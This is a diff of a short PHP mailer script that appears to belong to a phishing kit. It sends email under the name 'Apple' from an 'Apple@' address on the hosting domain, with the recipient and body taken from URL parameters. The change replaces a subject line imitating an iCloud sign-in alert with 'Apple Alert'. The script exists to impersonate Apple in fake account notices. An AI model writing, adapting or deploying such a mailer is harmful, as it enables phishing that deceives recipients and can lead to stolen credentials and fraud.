@@ -26,7 +26,7 @@
 //©Coder IrvanPramana @2019
 //--------------------------
 $name = "Apple"; $to = $_GET ['email']; $web="$_SERVER[HTTP_HOST]"; //bisa di custom domain
-$subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
+$subject = "Apple Alert"; 
 $body = $_GET ['pesan'];
 $email = "Apple@$web"; 
 $headers = 'From: ' .
